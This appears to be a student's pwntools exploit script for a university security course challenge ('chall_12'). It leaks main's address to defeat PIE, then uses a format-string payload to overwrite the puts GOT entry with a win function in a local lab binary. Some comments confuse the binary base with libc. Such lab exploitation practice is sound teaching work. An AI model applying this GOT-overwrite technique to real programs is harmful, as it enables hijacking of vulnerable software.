'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_12
File Description:  Like chall_11 with PIE

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   78) Symbols       No    0               2               chall_12

File info:
chall_12: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=54c96c24cf3f6258c22dea4a5cf8da1a9ec127db, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Vulns:
    32bit probably another WWW, using printf?
    Provides leak to main, could use this to find base of libc, then normal as usual.

'''

# Import libraries
from pwn import *

# Set up ELF
elf = ELF("./chall_12",checksec=False)

# Finding Offset (Found at ? with tons of %p)
offset = 7

# Start process
p=process("./chall_12")

# Use leak to find libc base of main
resp = p.recvuntil(b": ")
leak = p.recvuntil(b"\n")
leakInt = int(leak,16)
print("LEAK: ", leakInt)

# Set base of libc
elf.address = leakInt - elf.sym.main

# What to write, going to write address of win pretty much over GOT of puts
what = elf.sym.win

# Target == puts, since called after gets
target = elf.got.puts

payload = fmtstr_payload(offset,{target:what})      # Pretty much overwrite the entire start of it using $16hhn
print("PAYLOAD: ", payload)
p.sendline(payload)

# Recieve up till nulls to send line
null = payload.find(b'\x00')
p.recvuntil(payload[null-3:null])   # Catch all nulls

p.interactive()